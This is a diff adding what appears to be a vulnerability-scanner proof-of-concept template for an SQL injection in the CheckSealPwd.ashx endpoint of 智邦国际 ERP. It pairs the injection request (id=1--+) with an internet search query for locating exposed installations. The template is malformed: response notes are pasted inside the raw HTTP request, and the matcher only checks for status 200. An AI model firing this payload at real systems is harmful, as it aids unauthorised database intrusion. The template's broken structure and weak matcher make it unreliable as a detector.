@@ -1,0 +1,34 @@
+id: poc-ograruoxvstl1zqg
+info:
+  name: 智邦国际-CheckSealPwd-SQL注入
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ograruoxvstl1zqg'
+  tags: sqli,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ograruoxvstl1zqg
+    fofa: 'fofa: body="/SYSN/" hunter: app.name="智邦国际 ERP"'
+http:
+- raw:
+  - 'GET /SYSN/json/pcclient/CheckSealPwd.ashx?pwd=1&id=1--+ HTTP/1.1
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    false
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
